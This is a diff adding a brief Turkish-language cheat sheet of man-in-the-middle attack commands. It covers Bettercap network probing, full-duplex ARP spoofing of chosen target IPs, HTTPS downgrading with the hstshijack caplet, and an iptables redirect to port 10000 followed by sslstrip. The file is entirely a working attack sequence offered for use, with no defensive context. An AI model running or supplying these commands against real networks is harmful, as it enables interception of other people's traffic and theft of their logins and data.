@@ -1,0 +1,16 @@
+Bettercap:
+->bettercap -face <interface>
+->net.probe on
+->net.show
+->set arp.spoof.fullduplex true
+->set arp.spoof.targets <target_ip>, <target_ip>...
+->arp.spoof on (Komutu ile saldırımız başladı.)
+
+Bettercap ile HTTPS Düşürmek:
+    hstshijack/hstshijack (Kmoutu ile https site http'ye düşürmüş oluruz.Bettercap dosyasında caplets klasörünün içinde hstshijack bölümünden domainleri düzenleyebiliriz.)
+
+
+HTTPS Düşürmek:
+    ->iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+    ->sslstrip
+    
